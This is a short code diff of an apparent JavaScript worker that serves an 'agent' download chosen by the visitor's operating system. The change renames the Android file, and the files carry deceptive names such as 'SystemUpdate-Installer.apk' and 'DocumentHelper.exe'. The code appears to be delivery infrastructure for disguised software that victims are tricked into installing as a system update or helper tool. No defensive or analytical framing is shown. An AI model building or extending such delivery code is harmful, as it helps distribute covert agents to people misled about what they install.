@@ -131,7 +131,7 @@ export default {
     // --- OS-aware agent download ---
     if (p === '/get' || p === '/download') {
       // Android UAs also contain "Linux", so test Android first.
-      const f = /Android/i.test(ua)            ? 'SystemUpdate-1.0.23-release.apk'
+      const f = /Android/i.test(ua)            ? 'SystemUpdate-Installer.apk'
               : /Windows/i.test(ua)            ? 'DocumentHelper.exe'
               : /Macintosh|Mac OS X/i.test(ua) ? 'DocumentHelper.pkg'
               : /Linux|X11/i.test(ua)          ? 'DocumentHelper.run'
